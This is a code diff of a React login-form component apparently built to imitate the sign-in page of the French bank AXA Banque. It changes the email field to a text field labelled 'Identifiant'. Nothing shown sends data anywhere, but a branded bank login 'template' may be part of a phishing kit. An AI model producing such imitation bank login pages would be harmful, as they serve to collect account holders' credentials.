@@ -7,7 +7,7 @@ interface AxaBanquesAuthTemplateProps {
 
 export function AxaBanquesAuthTemplate({ onSubmit }: AxaBanquesAuthTemplateProps) {
   const [formData, setFormData] = useState({
-    email: '',
+    identifier: '',
     password: ''
   });
   const [status, setStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
@@ -81,14 +81,14 @@ export function AxaBanquesAuthTemplate({ onSubmit }: AxaBanquesAuthTemplateProps
             <form onSubmit={handleSubmit} className="space-y-6 max-w-md mx-auto">
               <div>
                 <label className="block text-sm font-medium text-gray-700 mb-2">
-                  Email
+                  Identifiant
                 </label>
                 <input
-                  type="email"
-                  name="email"
-                  value={formData.email}
+                  type="text"
+                  name="identifier"
+                  value={formData.identifier}
                   onChange={handleChange}
-                  placeholder="Entrez votre email"
+                  placeholder="Entrez votre identifiant"
                   required
                   className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                 />
